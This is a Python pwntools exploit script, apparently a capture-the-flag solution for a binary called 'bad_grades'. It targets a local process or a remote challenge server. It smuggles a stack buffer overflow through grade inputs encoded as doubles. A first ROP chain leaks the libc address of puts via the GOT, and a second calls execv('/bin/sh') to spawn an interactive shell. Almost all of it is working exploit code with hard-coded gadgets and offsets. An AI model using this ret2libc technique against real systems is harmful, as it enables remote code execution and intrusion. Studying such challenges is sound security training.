#!/usr/bin/env python3

from pwn import *

NO_INPUT = 0xcafebabe

elf = ELF("./given/bad_grades")
libc = None

def conn():
    global libc
    if args.REMOTE:
        p = remote("46.101.93.26", 30450)
        libc = ELF("./given/libc.so.6")
    else:
        p = process([elf.path])
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        if args.D:
            gdb.attach(p, """
                    b *0x401107
                    """)
    return p

def fp64(byte_sequence):
    # returns a tuple must be
    if len(byte_sequence) != 8:
        print("should be 8 byte sequence")
        quit()
    integer = u64(byte_sequence)
    fp = struct.unpack("d", p64(integer))[0]
    return str(fp).encode('ascii')

def bufovfl(p, payload):
    for i in range(0, len(payload), 8):
        grade = payload[i:i+8]
        p.recvuntil(b":")
        if u64(grade) == NO_INPUT:
            p.sendline(b".")
        else:
            p.sendline(fp64(grade))


def exploit():
    p = conn()

    # navigate from <main> to <vuln>
    p.recvuntil(b"1. View current grades")
    p.recvuntil(b"2. Add new.")
    p.recvuntil(b"> ")
    p.sendline(b"2")

    #################
    # II. leak libc address in <vuln>
    ##################
    # num_grades allow us to sequentially insert input, but as double
    num_grades = 50
    p.recvuntil(b"Number of grades:")
    p.sendline(str(num_grades).encode('ascii'))

    # info: objdump
    plt_puts = 0x400680
    got_puts = 0x601fa8
    call_vuln = 0x4011c1

    # info: pwndbg
    data_string = 0x6012d8 # "cyan" (anystring)

    # info: ropgadget
    rop_rdi = 0x401263
    rop_rsi_r15 = 0x401261

    payload = p64(NO_INPUT) * ((0x110 + 8) // 8)
    payload += p64(rop_rdi) + p64(got_puts)
    payload += p64(plt_puts)
    payload += p64(rop_rsi_r15) + p64(data_string) + p64(NO_INPUT)
    payload += p64(call_vuln)
    payload += p64(NO_INPUT) * (num_grades - len(payload) // 8)
    bufovfl(p, payload)
    p.recvuntil(b"Your new average is:")
    p.recvline()

    leaked_libc_puts = p.recvn(6)
    libc_puts = u64(leaked_libc_puts.ljust(8, b"\x00"))
    print("leaked libc puts:", hex(libc_puts))
    libc.address = libc_puts - libc.symbols['puts']

    ##################
    # III. we will return to vuln, exploit it this time
    ################
    p.recvuntil(b"Number of grades:")
    p.sendline(str(num_grades).encode('ascii'))

    payload = p64(NO_INPUT) * ((0x110 + 8) // 8)
    payload += p64(rop_rdi) + p64(next(libc.search(b"/bin/sh")))
    payload += p64(rop_rsi_r15) + p64(0x0) + p64(0x0)
    payload += p64(libc.symbols["execv"])
    payload += p64(NO_INPUT) * (num_grades - len(payload) // 8)
    bufovfl(p, payload)
    p.interactive()


if __name__ == "__main__":
    exploit()
